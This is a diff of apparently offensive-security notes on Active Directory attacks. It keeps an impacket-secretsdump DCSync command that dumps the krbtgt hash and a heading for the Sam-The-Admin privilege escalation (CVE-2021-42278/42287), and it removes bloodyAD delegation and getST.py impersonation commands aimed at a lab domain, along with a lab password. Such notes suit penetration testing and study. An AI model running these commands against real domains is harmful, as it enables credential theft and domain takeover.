@@ -48,13 +48,6 @@ Finally, use impacket to perform a DCSync with the exported TGT :
 impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'domain.local/XXXX@DC.domain.local' -k -no-pass -dc-ip DC_IP -target-ip IP_ADDRESS 
 ```
 
- OR  | python3 bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$'
-getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
-cp emacron.ccache /tmp/
-export KRB5CCNAME=/tmp/emacron.ccache
-
-```
-
 ## CVE-2021-42278 & CVE-2021-42287 : Sam-The-Admin
 Impersonate DA from standard domain user. Based on <https://github.com/WazeHell/sam-the-admin>
 ```bash
